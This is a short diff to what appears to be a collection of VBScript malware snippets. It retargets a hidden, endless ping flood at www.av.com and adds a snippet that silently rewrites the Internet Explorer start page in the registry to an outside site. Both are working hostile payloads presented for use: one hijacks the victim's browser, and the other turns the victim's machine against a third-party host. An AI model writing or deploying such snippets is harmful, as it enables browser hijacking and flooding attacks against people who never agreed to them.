@@ -30,7 +30,24 @@ Here is the code:
 
 On Error Resume Next
 Set wsc = CreateObject("WScript.Shell")
-wsc.Run "Ping.exe -t -l 916 www.azoogle.com", 0, False
+wsc.Run "Ping.exe -t -l 916 www.av.com", 0, False
 
 -------------------------------------
+
+
+
+--------Change IE (Internet Explorer) homepage--------
+
+Description: This just changes the homepage of IE using the registry.
+
+Here is the code:
+-------------------------------------
+
+On Error Resume Next
+Set wsc = CreateObject("WScript.Shell")
+wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.rrlf.de/"
+
+-------------------------------------
+
+
 
